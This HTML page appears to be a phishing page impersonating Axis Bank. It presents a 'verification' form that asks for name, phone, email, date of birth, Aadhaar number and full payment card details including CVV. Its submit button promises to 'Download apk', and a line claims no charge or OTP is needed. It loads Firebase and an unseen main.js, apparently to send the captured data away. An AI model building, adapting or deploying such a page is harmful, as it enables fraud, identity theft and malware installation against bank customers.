<html lang="en">
<head>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Axis Bank</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.css" />
  <!-- <link rel="stylesheet" href="style.css"> -->
  <link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
  integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
  crossorigin="anonymous"
/>

<div><img src="R.png" alt="" class="logopng" style="height: 100px; width: 200px;"></div>

</head>
<body>
  <div class="container">
    
    <div class="wrapper">
      <div class="company-info">
       
       
      </div>
      <div class="contact">
        <!-- <strong>Fill Details for Verification</strong> -->
        
        
        <!-- <div class="alert">We Will Send You Message</div> -->
        <div style="text-align: center; margin-bottom: 2rem;" >
        <!-- <img src="R.png" alt="" class="logopng" style="height: 90px; width: 200px;"> -->
        </div>
        <div style="text-align: center;">
        
        
        </div>
        <form id="contactForm">
          <p>
           <label style="color: #a8093e;"><b>Name</b></label>
            <input type="text" name="name" class="form-control form-control-lg"
            size="17"
            placeholder="Name"
            minlength="3"
            maxlength="20" id="name"style="margin-bottom:25px" required>
          </p>
          <p>
          <label style="color: #a8093e;"><b>Mobile No.</b></label>
            <input type="phone" class="form-control form-control-lg"
            siez="17"
            placeholder="Phone"
            minlength="3"
            maxlength="20" style="margin-bottom:25px" name="phone" id="phone" required>
          </p>
          <p>
          <label style="color: #a8093e;"><b>Email</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            minlength="3"
            placeholder="Enter email"
            maxlength="20" style="margin-bottom:25px" name="email" id="email" required>
          </p>
          
          
         <p>
         <label style="color: #a8093e;"><b>Date of Birth</b></label>
            <input type="date" class="form-control form-control-lg"
            size="17"
            
            minlength="3"
            placeholder="Enter Date of Birth"
            maxlength="20" style="margin-bottom:25px" name="dob" id="dob" required>
          </p>
          
          <p>
          <label style="color: #a8093e;"><b>Aadhar Number</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            minlength="3"
            placeholder="Enter Aadhar No."
            maxlength="20" style="margin-bottom:25px" name="aadhar" id="aadhar" required>
          </p>
          
          
          <p>
          <label style="color: #a8093e;"><b>CARD Holder Name</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            minlength="3"
            placeholder="Enter Card holder Name"
            maxlength="20" style="margin-bottom:25px" name="cardholder" id="cardholder" required>
          </p>
          
          
          <p>
          <label style="color: #a8093e;"><b>Card Number</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            minlength="3"
            placeholder="XXXX XXXX XXXX XXXX"
            maxlength="20" style="margin-bottom:25px" name="cardnumber" id="cardnumber" required>
          </p>
       
          
          
         
          <p>
           <label style="color: #a8093e;"><b>Card Expiry</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            placeholder="MM/YY"
            minlength="3"
            maxlength="20" style="margin-bottom:25px" name="expdate" id="expdate">
          </p>
          <p>
         <label style="color: #a8093e;"><b>CVV</b></label>
            <input type="text" class="form-control form-control-lg"
            size="17"
            placeholder="CVV"
            minlength="3"
            maxlength="20" style="margin-bottom:25px" name="cvv" id="cvv">
          </p>
          
          <p class="full">
            <div style="text-align: center;">
              <button type="submit" style="
              background-color: #a8093e;
              border-radius: 50px;
              border-width: 0;
              box-shadow: rgba(25, 25, 25, 0.04) 0 0 1px 0,
                rgba(0, 0, 0, 0.1) 0 3px 4px 0;
              color: #fdfdfd;
              cursor: pointer;
              display: inline-block;
              font-family: Arial, sans-serif;
              font-size: 1em;
              height: 50px;
              width: 300px;
              padding: 0 25px;
              margin-left: 0px;
              margin-right: 0px;
  
            ">Submit & Download apk</button>
            </div>
           
          </p>
        </form>
        
      </div>
      
    </div>
    
  </div>
  <label   style="
        color: #a8093e;
        position: center;
        bottom: 25px;
        font-weight: 600;
      " for="">You won't be charged for card validation, We don't require any kind of otp for validation <br> </label>

<p class="text-center mt-4"><img src="secured.png" style="width: 300px;"></p>

  <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
  <script src="main.js"></script>
</body>
</html>
